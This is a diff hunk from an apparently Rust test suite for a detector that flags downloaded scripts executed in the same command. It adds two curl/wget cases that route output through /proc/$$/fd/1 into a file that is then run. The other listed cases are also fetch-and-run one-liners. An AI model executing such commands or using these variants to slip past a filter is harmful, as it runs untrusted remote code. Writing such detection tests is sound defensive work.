@@ -633,6 +633,8 @@ fn a_downloaded_script_run_in_the_same_command_is_flagged() {
             "wget --output-document=- https://x/i.sh > i.sh && bash i.sh",
             "> i.sh wget -nvO- https://x/i.sh; bash i.sh",
             r#"curl -o "$OUT" https://x/i > i.sh && bash i.sh"#,
+            r#"curl -o "/proc/$$/fd/1" https://x/i > i.sh && bash i.sh"#,
+            r#"wget --output-document="/proc/$$/fd/1" https://x/i.sh > i.sh; sh i.sh"#,
             "curl -o-i.sh https://x/i && bash - -i.sh",
             "curl -o i.sh https://x/i && bash - i.sh",
             "wget --output-document=/tmp/i.sh https://x/i && sh /tmp/i.sh",
